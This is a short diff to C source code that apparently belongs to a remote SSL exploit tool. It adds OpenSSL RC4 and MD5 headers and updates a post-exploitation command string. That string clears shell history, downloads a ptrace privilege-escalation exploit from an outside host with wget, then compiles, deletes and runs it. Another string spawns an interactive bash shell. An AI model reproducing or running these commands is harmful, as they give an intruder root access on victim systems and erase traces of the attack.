@@ -22,6 +22,8 @@
 #include <openssl/rsa.h>
 #include <openssl/x509.h>
 #include <openssl/evp.h>
+#include <openssl/rc4.h>
+#include <openssl/md5.h>
 
 /* update this if you add architectures */
 #define MAX_ARCH 138
@@ -661,7 +663,7 @@ typedef struct {
 } ssl_conn;
 
 #define COMMAND1 "TERM=xterm; export TERM=xterm; exec bash -i\n"
-#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
+#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
 
 long getip(char *hostname) {
 	struct hostent *he;
